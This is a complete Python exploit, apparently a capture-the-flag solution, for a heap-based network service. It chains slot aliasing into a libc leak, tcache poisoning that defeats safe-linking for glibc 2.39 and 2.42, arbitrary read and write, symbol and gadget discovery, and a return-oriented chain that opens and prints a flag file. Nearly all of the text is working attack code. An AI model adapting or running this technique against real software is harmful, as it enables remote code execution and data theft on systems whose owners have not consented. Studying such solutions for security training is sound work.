#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import sys

p64 = lambda x: struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)
p32 = lambda x: struct.pack("<I", x & 0xFFFFFFFF)
p16 = lambda x: struct.pack("<H", x & 0xFFFF)
u64 = lambda b: struct.unpack("<Q", b[:8].ljust(8, b"\0"))[0]

FETCH_WRITE_RET_OFF = 0x2800
RECORDS_OFF = 0x6360
REC_SIZE = 0x58
PTR_OFF = 0x40
PHDR_OFF = 0x40
REG_READ_CALL_OFF = 0x2B09
REG_READ_POP_OFF = 0x2B38
REG_WRITE_CALL_OFF = 0x2EC9
REG_WRITE_POP_OFF = 0x2F00

OLD_ENVIRON_FROM_MAIN_ARENA = 0x7238
NEW_ENVIRON_FROM_MAIN_ARENA = 0x7308

TCACHE_OLD_FROM_FIRST_TYPE2 = 0x290
TCACHE_OLD_COUNTS_CTRL_OFF = 0x10
TCACHE_OLD_ENTRIES_CTRL_OFF = 0x20
TCACHE_OLD_COUNT_REL = 0x0E
TCACHE_OLD_ENTRY_REL = 0xD8

TCACHE_NEW_FROM_FIRST_TYPE2 = 0x310
TCACHE_NEW_ENTRIES_CTRL_OFF = 0xA0
TCACHE_NEW_ENTRY_REL = 0x80

AT_PHDR = 3

TCACHE_PROFILES = (
    {
        "name": "glibc-2.39-style",
        "mode": "dual-controller",
        "from_first_type2": TCACHE_OLD_FROM_FIRST_TYPE2,
        "counts_ctrl_off": TCACHE_OLD_COUNTS_CTRL_OFF,
        "entries_ctrl_off": TCACHE_OLD_ENTRIES_CTRL_OFF,
        "count_rel": TCACHE_OLD_COUNT_REL,
        "entry_rel": TCACHE_OLD_ENTRY_REL,
        "environ_from_main_arena": OLD_ENVIRON_FROM_MAIN_ARENA,
    },
    {
        "name": "glibc-2.42-style",
        "mode": "entries-only",
        "from_first_type2": TCACHE_NEW_FROM_FIRST_TYPE2,
        "entries_ctrl_off": TCACHE_NEW_ENTRIES_CTRL_OFF,
        "entry_rel": TCACHE_NEW_ENTRY_REL,
        "environ_from_main_arena": NEW_ENVIRON_FROM_MAIN_ARENA,
    },
)


class RRD:
    def __init__(self, host, port, timeout=10):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.recvuntil(b"rrd> ")

    def recvuntil(self, delim):
        data = b""
        while not data.endswith(delim):
            c = self.s.recv(1)
            if not c:
                raise EOFError(data)
            data += c
        return data

    def recvn(self, n):
        data = b""
        while len(data) < n:
            c = self.s.recv(min(65536, n - len(data)))
            if not c:
                raise EOFError(data)
            data += c
        return data

    def cmd(self, line):
        if isinstance(line, str):
            line = line.encode()
        self.s.sendall(line + b"\n")
        return self.recvuntil(b"rrd> ")

    def reserve(self, slot, typ, name="A"):
        d = self.cmd(f"RESERVE {slot} {typ} {name}")
        if b"OK" not in d:
            raise RuntimeError(f"RESERVE failed {slot}: {d!r}")

    def seal(self, slot):
        d = self.cmd(f"SEAL {slot}")
        if b"OK" not in d:
            raise RuntimeError(f"SEAL failed {slot}: {d!r}")

    def mirror(self, slot, archive):
        d = self.cmd(f"MIRROR {slot} {archive}")
        if b"OK" not in d:
            raise RuntimeError(f"MIRROR failed {slot}: {d!r}")

    def replay(self, archive, slot):
        d = self.cmd(f"REPLAY {archive} {slot}")
        if b"OK" not in d:
            raise RuntimeError(f"REPLAY failed {archive}->{slot}: {d!r}")

    def retire(self, slot):
        d = self.cmd(f"RETIRE {slot}")
        if b"OK" not in d:
            raise RuntimeError(f"RETIRE failed {slot}: {d!r}")

    def alias(self, slot, archive, alias_slot):
        self.seal(slot)
        self.mirror(slot, archive)
        self.replay(archive, alias_slot)

    def stage(self, slot, data):
        self.s.sendall(f"STAGE {slot} {len(data)}\n".encode() + data)
        d = self.recvuntil(b"rrd> ")
        if b"OK" not in d:
            raise RuntimeError(f"STAGE failed {slot}: {d!r}")
        return d

    def fetch(self, slot, n):
        self.s.sendall(f"FETCH {slot} {n}\n".encode())
        h = self.recvuntil(b"\n")
        if h != b"DATA\n":
            rest = self.recvuntil(b"rrd> ")
            raise RuntimeError(f"FETCH failed {slot}: {h!r}{rest!r}")
        data = self.recvn(n)
        self.recvuntil(b"rrd> ")
        return data

    def interactive_read(self, timeout=3):
        self.s.settimeout(timeout)
        out = b""
        while True:
            try:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                out += chunk
            except socket.timeout:
                break
        return out


class Exploit:
    def __init__(self, host, port, flag_path, tcache_profile):
        self.r = RRD(host, port)
        self.ctrl_slot = None
        self.flag_path = flag_path
        self.tcache_profile = tcache_profile

    def log(self, msg):
        print(msg, flush=True)

    def alias_pair(self, a, a_alias, a_arch, b=None, b_alias=None, b_arch=None, typ=2):
        self.r.reserve(a, typ, f"S{a}")
        if b is not None:
            self.r.reserve(b, typ, f"S{b}")
        self.r.alias(a, a_arch, a_alias)
        if b is not None:
            self.r.alias(b, b_arch, b_alias)
        self.r.retire(a)
        if b is not None:
            self.r.retire(b)

    def type2_addrs_from_leak(self, enc):
        a = enc
        for _ in range(12):
            a = enc ^ ((a + 0x110) >> 12)
        b = a + 0x110
        return a, b

    def direct_type2_target(self, target):
        mode = self.tcache_profile["mode"]
        if mode == "dual-controller":
            cnt_rel = self.tcache_profile["count_rel"]
            entry_rel = self.tcache_profile["entry_rel"]
            cnt = bytearray(cnt_rel + 2)
            cnt[cnt_rel:cnt_rel + 2] = p16(1)
            self.r.stage(9, bytes(cnt))
            ent = bytearray(entry_rel + 8)
            ent[entry_rel:entry_rel + 8] = p64(target)
            self.r.stage(15, bytes(ent))
            return
        if mode == "entries-only":
            entry_rel = self.tcache_profile["entry_rel"]
            ent = bytearray(entry_rel + 8)
            ent[entry_rel:entry_rel + 8] = p64(target)
            self.r.stage(9, bytes(ent))
            return
        raise RuntimeError(f"unknown tcache mode: {mode}")

    def alloc_type2_at(self, slot, target):
        self.direct_type2_target(target)
        self.r.reserve(slot, 2, f"T{slot}")

    def direct_read(self, slot, addr, n, pad=0x30):
        base = (addr - pad) & ~0xF
        off = addr - base
        if off + n > 0x100:
            raise ValueError("direct_read range too large for one type-2 slot")
        self.alloc_type2_at(slot, base)
        data = self.r.fetch(slot, off + n)
        return data[off:off + n]

    def direct_read_qword(self, slot, addr):
        return u64(self.direct_read(slot, addr, 8))

    def leak_libc(self):
        self.alias_pair(0, 1, 0, 2, 3, 1, typ=3)
        leak = self.r.fetch(1, 0x20)
        main_arena = u64(leak[:8])
        self.log(f"[+] unsorted leak = {main_arena:#x}")
        return main_arena

    def setup_tcache_controllers(self):
        self.alias_pair(4, 5, 2, 6, 7, 3, typ=2)
        enc = u64(self.r.fetch(7, 8))
        a, b = self.type2_addrs_from_leak(enc)
        tcache = a - self.tcache_profile["from_first_type2"]
        self.log(f"[+] type-2 leak: enc={enc:#x}, A={a:#x}, B={b:#x}")
        self.log(f"[+] tcache struct ~= {tcache:#x}")
        mode = self.tcache_profile["mode"]
        if mode == "dual-controller":
            self.r.stage(7, p64((tcache + self.tcache_profile["counts_ctrl_off"]) ^ (b >> 12)))
            self.r.reserve(8, 2, "C8")
            self.r.reserve(9, 2, "C9")

            self.alias_pair(10, 11, 4, 12, 13, 5, typ=2)
            enc2 = u64(self.r.fetch(13, 8))
            _, b2 = self.type2_addrs_from_leak(enc2)
            self.r.stage(13, p64((tcache + self.tcache_profile["entries_ctrl_off"]) ^ (b2 >> 12)))
            self.r.reserve(14, 2, "D14")
            self.r.reserve(15, 2, "D15")
        elif mode == "entries-only":
            self.r.stage(7, p64((tcache + self.tcache_profile["entries_ctrl_off"]) ^ (b >> 12)))
            self.r.reserve(8, 2, "C8")
            self.r.reserve(9, 2, "C9")
        else:
            raise RuntimeError(f"unknown tcache mode: {mode}")

        self.log("[+] established type-2 arbitrary-allocation controller")

    def leak_auxv(self, main_arena):
        env_addr = main_arena + self.tcache_profile["environ_from_main_arena"]
        envp = self.direct_read_qword(18, env_addr)
        self.log(f"[+] environ -> {envp:#x}")
        blob = b""
        for slot, off in ((17, 0), (19, 0xB0), (20, 0x160), (21, 0x210), (16, 0x2C0)):
            blob += self.direct_read(slot, envp + off, 0xB0, pad=0x20)
        pos = None
        for i in range(0, len(blob) - 16, 8):
            if u64(blob[i:i + 8]) == 0:
                nxt = u64(blob[i + 8:i + 16])
                if 1 <= nxt <= 0x100:
                    pos = i + 8
                    break
        if pos is None:
            raise RuntimeError("failed to locate auxv after envp")
        aux = {}
        for i in range(pos, len(blob) - 16, 16):
            tag = u64(blob[i:i + 8])
            val = u64(blob[i + 8:i + 16])
            if tag == 0:
                break
            aux[tag] = val
        phdr = aux.get(AT_PHDR)
        if not phdr:
            raise RuntimeError("AT_PHDR not found")
        self.log(f"[+] AT_PHDR = {phdr:#x}")
        return envp, phdr

    def setup_record23(self, pie):
        ctrl = pie + RECORDS_OFF + 23 * REC_SIZE + PTR_OFF - 8
        self.alloc_type2_at(22, ctrl)
        self.ctrl_slot = 22
        self.pie = pie
        self.rec23_ptr = ctrl + 8
        self.log(f"[+] PIE base = {pie:#x}")
        self.log(f"[+] record[23] controller = {ctrl:#x}")

    def set23(self, addr, size=0x100000):
        payload = b"JUNKJUNK" + p64(addr) + p64(size) + p32(0) + bytes([3, 1])
        self.r.stage(self.ctrl_slot, payload)

    def ar_read(self, addr, n):
        self.set23(addr, max(n, 0x1000))
        return self.r.fetch(23, n)

    def find_elf_base(self, ptr, max_back=0x800000):
        p = ptr & ~0xFFF
        for off in range(0, max_back, 0x1000):
            a = p - off
            try:
                if self.ar_read(a, 4) == b"\x7fELF":
                    return a
            except Exception:
                pass
        raise RuntimeError("ELF base not found")

    def parse_elf_dynamic(self, base):
        eh = self.ar_read(base, 0x40)
        if eh[:4] != b"\x7fELF":
            raise RuntimeError("bad ELF")
        e_phoff = u64(eh[0x20:0x28])
        e_phentsize = struct.unpack("<H", eh[0x36:0x38])[0]
        e_phnum = struct.unpack("<H", eh[0x38:0x3A])[0]
        ph = self.ar_read(base + e_phoff, e_phentsize * e_phnum)
        loads = []
        dyn = None
        for i in range(e_phnum):
            p = ph[i * e_phentsize:(i + 1) * e_phentsize]
            typ = struct.unpack("<I", p[:4])[0]
            flags = struct.unpack("<I", p[4:8])[0]
            vaddr = u64(p[16:24])
            filesz = u64(p[32:40])
            memsz = u64(p[40:48])
            if typ == 1:
                loads.append((base + vaddr, filesz, memsz, flags))
            elif typ == 2:
                dyn = (base + vaddr, memsz)
        if not dyn:
            raise RuntimeError("no dynamic segment")
        dd = self.ar_read(dyn[0], min(dyn[1], 0x8000))
        d = {}
        for i in range(0, len(dd), 16):
            tag = u64(dd[i:i + 8])
            val = u64(dd[i + 8:i + 16])
            if tag == 0:
                break
            d[tag] = val

        def norm(x):
            return x if x >= base else base + x

        symtab = norm(d[6])
        strtab = norm(d[5])
        strsz = d.get(10, 0x20000)
        if 4 in d:
            _, nchain = struct.unpack("<II", self.ar_read(norm(d[4]), 8))
            nsyms = nchain
        else:
            nsyms = 6000
        strdata = self.ar_read(strtab, strsz)
        symdata = self.ar_read(symtab, nsyms * 24)
        want = {"__libc_stack_end", "exit", "open", "read", "write"}
        syms = {}
        undef_want = {}
        for i in range(nsyms):
            ent = symdata[i * 24:(i + 1) * 24]
            st_name = struct.unpack("<I", ent[:4])[0]
            st_value = u64(ent[8:16])
            if st_name and st_name < len(strdata):
                end = strdata.find(b"\0", st_name)
                if end > st_name:
                    name = strdata[st_name:end].decode("latin1", "ignore")
                    if name in want and name not in syms:
                        if st_value:
                            syms[name] = base + st_value
                        else:
                            undef_want[i] = name

        def scan_relas(addr, size):
            if not addr or not size:
                return
            data = self.ar_read(norm(addr), min(size, 0x400000))
            for off in range(0, len(data) - 23, 24):
                r_offset = u64(data[off:off + 8])
                r_info = u64(data[off + 8:off + 16])
                symidx = r_info >> 32
                name = undef_want.get(symidx)
                if name and name not in syms:
                    val = u64(self.ar_read(norm(r_offset), 8))
                    if val:
                        syms[name] = val

        scan_relas(d.get(7, 0), d.get(8, 0))
        scan_relas(d.get(23, 0), d.get(2, 0))
        return loads, syms

    def find_gadgets(self, loads):
        base = None
        blob = b""
        for a, filesz, _, flags in loads:
            if flags & 1:
                base = a
                for off in range(0, filesz, 0x8000):
                    blob += self.ar_read(a + off, min(0x8000, filesz - off))
                break
        if base is None:
            raise RuntimeError("no executable libc load")

        def find(pat):
            i = blob.find(pat)
            return None if i < 0 else base + i

        g = {"ret": find(b"\xC3"), "pop_rdi": find(b"\x5F\xC3"), "pop_rsi": find(b"\x5E\xC3")}
        missing = [k for k in ("ret", "pop_rdi", "pop_rsi") if not g.get(k)]
        if missing:
            raise RuntimeError(f"missing gadgets: {missing}")
        return g

    def locate_stage_read_ret_slot(self, stack_hint):
        scan = 0x30000
        start = (stack_hint - scan) & ~0xF
        blob = self.ar_read(start, scan)
        marker = self.pie + FETCH_WRITE_RET_OFF
        hits = []
        for i in range(0, len(blob) - 8, 8):
            if u64(blob[i:i + 8]) == marker:
                hits.append(start + i)
        if not hits:
            for i in range(0, len(blob) - 8, 8):
                v = u64(blob[i:i + 8])
                if self.pie + 0x2700 <= v <= self.pie + 0x2900:
                    hits.append(start + i)
        if not hits:
            raise RuntimeError("could not locate libc-call return slot for STAGE read")
        ret = hits[-1]
        self.log(f"[+] selected live read-return stack slot {ret:#x} (FETCH marker {marker:#x})")
        return ret

    def reg_read_chain(self, fd, buf, count, next_rip):
        return [
            self.pie + REG_READ_POP_OFF,
            0x0,
            count,
            fd,
            0x0,
            buf,
            0x0,
            self.pie + REG_READ_CALL_OFF,
            0x0,
            0x0,
            0x0,
            0x0,
            0x0,
            0x0,
            next_rip,
        ]

    def reg_write_chain(self, fd, buf, count, next_rip):
        return [
            self.pie + REG_WRITE_POP_OFF,
            0x0,
            buf,
            count,
            fd,
            0x0,
            0x0,
            self.pie + REG_WRITE_CALL_OFF,
            0x0,
            0x0,
            0x0,
            0x0,
            0x0,
            0x0,
            0x0,
            next_rip,
        ]

    def run(self):
        self.r.cmd("HELLO exploit")
        self.setup_tcache_controllers()
        main_arena = self.leak_libc()
        stack_hint, phdr = self.leak_auxv(main_arena)
        pie = phdr - PHDR_OFF
        self.setup_record23(pie)

        libc = self.find_elf_base(main_arena)
        self.log(f"[+] libc base = {libc:#x}")
        if self.ar_read(libc, 4) != b"\x7fELF":
            raise RuntimeError("record23 libc sanity failed")
        if self.ar_read(pie, 4) != b"\x7fELF":
            raise RuntimeError("record23 PIE sanity failed")

        loads, syms = self.parse_elf_dynamic(libc)
        self.log("[+] resolved symbols: " + ", ".join(f"{k}={v:#x}" for k, v in syms.items()))
        g = self.find_gadgets(loads)
        self.log("[+] gadgets: " + ", ".join(f"{k}={v:#x}" for k, v in g.items()))

        if "__libc_stack_end" in syms:
            stack_hint = u64(self.ar_read(syms["__libc_stack_end"], 8))
            self.log(f"[+] __libc_stack_end -> {stack_hint:#x}")
        else:
            self.log(f"[+] using environ-derived stack hint {stack_hint:#x}")

        retaddr = self.locate_stage_read_ret_slot(stack_hint)
        path = self.flag_path.encode() + b"\0"
        path_off = 0x140
        buf_off = 0x1c0
        path_addr = retaddr + path_off
        buf_addr = retaddr + buf_off
        io_len = 0x78

        chain = [g["ret"], g["pop_rdi"], path_addr, g["pop_rsi"], 0, syms["open"]]
        chain += self.reg_read_chain(3, buf_addr, io_len, self.pie + REG_WRITE_POP_OFF)
        chain += self.reg_write_chain(1, buf_addr, io_len, syms.get("exit", 0))
        payload = b"".join(p64(x) for x in chain)
        if len(payload) > path_off:
            raise RuntimeError(f"ROP too long: {len(payload)}")
        payload = payload.ljust(path_off, b"\0") + path
        payload = payload.ljust(buf_off + io_len, b"\0")

        self.log(f"[+] arming record 23 to overwrite live read return at {retaddr:#x} with {len(payload)} bytes")
        self.set23(retaddr, max(len(payload), 0x1000))
        self.r.s.sendall(f"STAGE 23 {len(payload)}\n".encode())
        self.r.recvuntil(b"READY\n")
        self.r.s.sendall(payload)
        out = self.r.interactive_read(timeout=3)
        m = re.search(rb"BKISC\{[^}]+\}", out)
        if m:
            self.log(f"[+] flag: {m.group(0).decode('latin1', 'replace')}")
        else:
            self.log("[!] flag marker not found; raw output follows")
            sys.stdout.buffer.write(out)
            sys.stdout.buffer.flush()


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5000)
    ap.add_argument("--flag-path", default="/opt/chal/flag.txt")
    args = ap.parse_args()
    last_exc = None
    for profile in TCACHE_PROFILES:
        try:
            print(f"[*] trying tcache profile: {profile['name']}", flush=True)
            Exploit(args.host, args.port, args.flag_path, profile).run()
            sys.exit(0)
        except Exception as exc:
            last_exc = exc
    raise last_exc
